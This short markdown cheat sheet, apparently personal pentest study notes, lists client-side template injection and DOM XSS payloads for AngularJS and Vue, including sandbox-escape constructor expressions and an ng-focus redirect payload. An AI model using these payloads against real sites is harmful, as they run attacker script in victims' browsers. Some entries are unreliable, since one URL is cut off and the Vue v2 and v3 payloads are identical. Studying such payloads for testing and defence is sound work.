__Check more VUE payloads in [portsigger](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#vuejs-reflected)__
![image1](Image/xss.png)

## DOM XSS in AngularJS expression

- __When HTML contains ng-app attribute__
  - __you can execute arbitrary JavaScript code__
  - __To get the payloads go to book.hacktricks.xyz__
  - __use any payload in the search bar__
```javascript
{{$on.constructor('alert(1)')()}}
{{constructor.constructor('alert(1)')()}}
<input ng-focus=$event.view.alert('XSS')>

<!-- Google Research - AngularJS -->
<div ng-app ng-csp><textarea autofocus ng-focus="d=$event.view.document;d.location.hash.match('x1') ? '' : d.location='//localhost/mH/'"></textarea></div>
```

## vueJS
- Working payload: `https://vue-client-side-template-injection-example.azu.now.sh/?name=%7B%7Bthis.constructor.constructor(%27alert(%22foo%22)%27)()%7D%`
- A really good post on CSTI in VUE can be found in [portswigger.net](https://portswigger.net/research/evading-defences-using-vuejs-script-gadgets)
  ### v3
    - `{{_openBlock.constructor('alert(1)')()}}`
  
  ### v2
    - `{{_openBlock.constructor('alert(1)')()}}`
